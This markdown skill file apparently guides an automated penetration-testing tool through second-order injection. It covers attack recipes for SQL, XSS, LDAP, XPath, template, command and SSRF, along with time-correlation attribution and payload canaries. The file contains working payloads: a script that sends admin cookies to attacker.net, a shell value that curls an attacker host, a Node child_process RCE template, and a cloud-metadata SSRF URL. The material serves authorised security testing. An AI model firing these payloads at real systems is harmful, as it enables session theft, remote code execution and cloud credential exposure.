---
name: second-order-injection-advanced-deep
description: Second-order injection advanced depth — per-class second-order recipes (SQL/LDAP/XPath/template/expression/command/XSS), time-correlation attribution methodology, scheduled-job / replication / admin-dashboard firing-path audit, and stored-canary payload families
sibling: second_order_injection
load_when: scan_mode == "deep"
---

# Second-Order Injection — Advanced + Expert Depth

This is the advanced+expert deep sibling to `second_order_injection.md`. The base owns the two-path pattern, time-correlation discipline, downstream-class routing, and attack-surface framing. This file owns the full established technique surface at depth: per-class second-order recipes with full P/P/A/C/I treatment per class (second-order SQL, second-order XSS, second-order LDAP, second-order XPath, second-order template/expression, second-order command, second-order SSRF), time-correlation attribution methodology, scheduled-job and replication-path audit, and stored-canary payload families. The novel sibling owns the 2024-2026 CVE catalog.

Load this file when the goal is reasoning about which stored field reaches which firing path, choosing a canary payload for probing a specific firing-site class, or constructing time-correlation attribution for a batch-job-fired injection.

## Per-Class Second-Order Recipes

### Second-Order SQL Injection

**Primitive.** Field stored via parameterized INSERT; later composed into a dynamic SELECT/UPDATE via concatenation.

**Preconditions:**
1. Storage path uses parameterized query (safe).
2. Firing-path code composes SQL from the stored value using string concatenation.
3. Attacker's input survives storage without transformation (no normalization that strips SQL metacharacters).

**Attack recipe:**
```
# Step 1 — Register with SQL-injection-shaped username
POST /register
username='-- or 1=1 or '  password=anything&email=a@a.com
# INSERT INTO users (username, ...) VALUES (?, ...) → parameterized; stored as literal

# Step 2 — Admin triggers reports page
# Server-side (vulnerable):
#   SELECT u.*, r.* FROM users u JOIN audit r ON r.user = '{u.username}'
# The {u.username} substitution concatenates; firing-path injection

# Step 3 — Observe firing effect
# Error page, OAST hit, data exfil shape
```

**Confirmation signals.**
1. **Error-based.** SQL syntax error on firing path with stored content.
2. **UNION-based.** Firing path returns data from attacker-chosen table.
3. **Blind boolean.** Firing-path differential signal (admin page content differs).
4. **OAST via DBMS network primitive.** `xp_cmdshell`, `UTL_HTTP`, `LOAD_FILE` with OAST domain stored at storage time, fired on firing path.
5. **Time-based.** `SLEEP(5)` or `WAITFOR DELAY '00:00:05'` stored at storage; firing path delays by 5s.

**Impact.** Full SQL injection on the firing path — route to `sql_injection.md` for the per-DBMS post-exploitation.

### Second-Order XSS

**Primitive.** Field stored (HTML-escaped at store time or stored raw); firing-path admin UI reads and renders without escaping.

**Preconditions:**
1. Storage path accepts attacker HTML / JavaScript.
2. Firing-path admin UI renders stored content without escape.
3. Admin visits the firing page.

**Attack recipe:**
```html
<!-- Step 1 — Register with XSS payload in username -->
username=<script>fetch('http://attacker.net/'+document.cookie)</script>

<!-- Step 2 — Wait for admin to visit the user-list page -->
<!-- Admin page template:
     <td>{{ user.username|safe }}</td>  -- Jinja2 |safe disables escape
-->

<!-- Step 3 — Admin's browser renders the stored script -->
```

**Confirmation.** OAST callback with admin's cookie / token in query string.

**Impact.** Admin impersonation; full admin privilege. Route to `xss.md`.

### Second-Order LDAP Injection

**Primitive.** Field stored via parameterized LDAP operation; firing-path sync job composes filter via concatenation.

**Preconditions:**
1. Storage path uses `ldap_add` with parameterized attribute values (safe).
2. Firing-path sync job composes LDAP search filter from the stored attribute value.

**Attack recipe:**
```python
# Step 1 — Register with LDAP-injection-shaped display name
display_name = "attacker)(|(uid=*"
# User created via ldap_add; attribute stored literally

# Step 2 — Scheduled sync job runs:
#   filter = f"(displayName={stored_display_name})"
#   results = ldap.search(base, filter)
# Firing-path injection: (displayName=attacker)(|(uid=*))
# Attacker's user matches + wildcard-matches all users
```

**Confirmation.** Sync job log shows broader result-set than expected; sync job's downstream (notification, admin table, cross-system data push) reaches attacker-chosen scope.

**Impact.** Directory-wide reach via sync. Route to `ldap_injection.md`.

### Second-Order XPath Injection

**Primitive.** Field stored; firing-path reads and composes XPath via concatenation.

**Attack recipe:**
```
# Step 1 — Store XPath-injection-shaped value
display_name = "attacker') or '1'='1"

# Step 2 — Firing path (admin search):
#   xpath = f"/users/user[name='{display_name}']"
#   result = tree.xpath(xpath)
# Composed: /users/user[name='attacker') or '1'='1']  → syntax error OR truthified predicate
```

**Confirmation.** XPath error OR result-set expansion on firing path. Route to `xpath_injection.md`.

### Second-Order Template / Expression Injection

**Primitive.** Field stored; firing-path reads and evaluates as template or expression.

**Attack recipe:**
```
# Step 1 — Store template-injection payload (e.g., workflow description field)
description = "{{ ({}).constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString() }}"

# Step 2 — Firing path renders description via template engine
#   rendered = template.render(user.description, context={user})
# The attacker-authored template reaches Function constructor
```

**Confirmation.** Reflected exec output in rendered admin page; OAST hit.

**Impact.** Full RCE on firing path. Route to `ssti.md` or `ssji.md`.

### Second-Order Command Injection

**Primitive.** Field stored (as shell-argument-shaped value); firing-path reads and composes shell command via concatenation.

**Attack recipe:**
```python
# Step 1 — Store command-injection-shaped value
username = "attacker; curl http://attacker.net/exfil"

# Step 2 — Scheduled backup job:
#   os.system(f"backup-user {username}")  # or exec(f"...")
# Composed: backup-user attacker; curl http://attacker.net/exfil
```

**Confirmation.** OAST hit at scheduled-job execution time. Route to `rce.md`.

### Second-Order SSRF

**Primitive.** URL field stored (format-validated but not reach-validated); firing-path fetches without re-validation.

**Attack recipe:**
```
# Step 1 — Store internal URL
avatar_url = "http://169.254.169.254/latest/meta-data/"
# Stored (format passes URL validation)

# Step 2 — Image-processing job:
#   requests.get(user.avatar_url).content
# Firing-path fetch reaches internal metadata
```

**Confirmation.** Fetch response contains metadata content. Route to `ssrf.md`.

## Time-Correlation Attribution Methodology

### Protocol — Attributing a Firing Event to a Storage Event

1. **Storage timestamp.** T_store = time of storage request.
2. **Firing-event discovery.** Observe T_fire — when did the firing path execute.
3. **Candidate storage-paths at T_store.** Which paths wrote data that could reach the firing path at T_fire.
4. **Payload uniqueness.** The stored canary should be unique enough that T_fire's log unambiguously points to T_store's storage event.

### Scheduled Job Firing — Clock Alignment

For cron-fired paths:
```bash
# Observe scheduled-job cadence (daily at 02:00, hourly, every 5 min)
# Submit canary at T_store = T_scheduled - 30s
# Expect T_fire = T_scheduled
# Correlation: firing within 1 minute of scheduled time
```

### Admin-Dashboard Firing — Trigger via Admin Visit

The attacker cannot usually trigger an admin's own browser visit. Scope the attack to:
- Admin visits are routine (daily, hourly).
- Attacker's canary must survive storage long enough to be read on next admin visit.
- Confirmation: OAST callback with admin's User-Agent + source IP.

### Replication / Sync Firing — Cross-Tenant

For cross-tenant sync:
- Attacker's storage in Tenant A.
- Sync job pushes to Tenant B.
- Firing-path effect observable in Tenant B's admin view OR Tenant B's downstream system.

## Stored-Canary Payload Families

Universal canary payloads that probe multiple firing-path classes:

```
# SQL probe (works for most DBMS)
'||(SELECT pg_sleep(5))||'
'' UNION SELECT null,null,null--

# XSS probe (works for most render contexts)
<script>fetch('http://canary.oast.fun/sql?x='+btoa(document.cookie))</script>

# LDAP probe
*)(|(uid=*

# XPath probe
' or '1'='1

# Template/expression probe
${7*7}  <!-- or -->  {{7*7}}  <!-- or -->  #{7*7}

# Command probe
`curl http://canary.oast.fun/cmd`

# SSRF probe
http://canary.oast.fun/url  <!-- or -->  http://169.254.169.254/
```

Store each as a separate canary; observe different OAST subdomains (`sql.canary.oast.fun`, `xss.canary.oast.fun`, etc.) to attribute the firing path to the probe class.

## Scheduled-Job / Replication-Path Audit

### Grep Targets per Platform

**Rails:**
```bash
# Scheduled jobs
grep -rn 'Sidekiq\|Resque\|DelayedJob\|whenever\|rake' app/
# Replication
grep -rn 'ActiveRecord::Replica\|rails replica' config/
```

**Django:**
```bash
grep -rn 'celery\|periodic_task\|django-q' .
```

**Node:**
```bash
grep -rn 'node-cron\|bull\|agenda\|kue' .
```

**Enterprise ETL:**
```bash
# Camel, Spring Integration, Mulesoft, Informatica
grep -rn 'camel-' pom.xml
grep -rn 'spring-integration-' pom.xml
```

### Firing-Path Classes Reachable in Scheduled Jobs

- **Direct SQL** — report generation, data export.
- **LDAP sync** — directory sync, OIDC/SAML sync.
- **Command execution** — backup, provisioning, deprovisioning.
- **File operations** — attachment processing, archive generation.
- **Network** — email, notification, webhook.

Each firing path has specific reachable injection class per the mapping above.

## Composite Chains at Advanced Depth

### Stored Workflow → Scheduled Execution → RCE
1. **Precondition:** workflow DSL field stored unparsed.
2. **Reach:** scheduled workflow executor reads field.
3. **Trigger:** workflow evaluation reaches Function sink.
4. **Impact:** host RCE.
Route: this file → `ssji.md`.

### Stored LDAP Attribute → Directory Sync → Cross-Tenant Compromise
1. **Precondition:** LDAP attribute stored with injection-shape.
2. **Reach:** nightly LDAP sync job.
3. **Trigger:** sync composes filter via concatenation.
4. **Impact:** attribute propagated to cross-tenant directory.
Route: this file → `ldap_injection.md`.

### Stored URL → Image-Fetch Job → Metadata Exfil
1. **Precondition:** URL field stored (format-validated only).
2. **Reach:** image-processing job runs.
3. **Trigger:** fetch internal metadata URL.
4. **Impact:** metadata contents in image-processing output / log.
Route: this file → `ssrf.md`.

## Advanced Testing Methodology

1. **Enumerate all persistent user-authored fields.** Profile, settings, workflow DSL, config, URL, email, file metadata.
2. **For each field, submit the universal canary set.** SQL + XSS + LDAP + XPath + template + command + SSRF — each with distinct OAST subdomain.
3. **Enumerate firing paths.** Admin UI, scheduled jobs, replication, sync, batch, cron.
4. **For admin firing paths, observe OAST during admin's regular work hours.** May require hours-to-days observation.
5. **For scheduled firing paths, align submission with job cadence.** Store ~30s before expected execution.
6. **For replication firing paths, submit in Tenant A and observe Tenant B.**
7. **Correlate via unique canary content.** `canary-id-UUID` in payload lets attribution unambiguous.

## Advanced Validation

- **Firing-path effect must be a direct consequence of the stored canary.** Not coincidental.
- **The firing path should ideally be reachable by attacker-triggerable means.** Admin-only visits are weaker but still findings.
- **Time-correlation between storage and firing is the attribution.** Logs should show the chain.
- **Second-order claims should enumerate the storage-to-firing mapping explicitly.** "Field X stored at endpoint Y reaches firing path Z" format.

## Advanced Pro Tips

- **The firing path is the vulnerable code; the storage path is the attack vector.** Developers often review only the storage path.
- **"Trusted data from the database" is a frequent cognitive bias.** The data is only trusted at the schema level, not at the SQL / LDAP / shell level.
- **Scheduled-job firing paths are stealth attack surfaces.** They don't appear in request logs; the attribution requires job-execution logs.
- **Cross-tenant replication is a cross-tenant privilege-elevation path.** Attacker in Tenant A reaches Tenant B via sync.
- **File-metadata extraction (EXIF, PDF, Office doc properties) is a storage path.** The metadata is extracted and stored unescaped; later use is often unescaped.
- **The time-correlation discipline is the differentiator.** First-order injection fires at request time; second-order fires at firing time. Logs should distinguish.

## Advanced Tooling

- **Burp Suite Scanner** — second-order mode tracks stored payloads across subsequent responses.
- **sqlmap --second-order** — automated second-order SQL probing.
- **Collaborator-based canary system** — distinct OAST subdomains per probe class.
- **Application log inspection** — attribution requires reading firing-path logs.

The second-order-injection class is cross-cutting — each firing-path class is primary-owned by its respective skill; this skill owns the two-path pattern + time-correlation attribution + storage-to-firing enumeration discipline. The primitive is complete; the trio is intentionally compact relative to primary-injection classes, not a stop-short.

## Summary

The second-order-injection advanced tier is the full established technique surface at depth: per-class second-order recipes with full P/P/A/C/I treatment per class (SQL, XSS, LDAP, XPath, template/expression, command, SSRF); time-correlation attribution methodology (storage timestamp + firing event + candidate-path mapping + unique canary); scheduled-job and replication-path audit per platform (Rails/Django/Node/enterprise-ETL); stored-canary payload families with distinct OAST subdomains per probe class; and composite chains. Each CVE in `second_order_injection_novel_deep.md` reduces to one of these class-specific primitives.
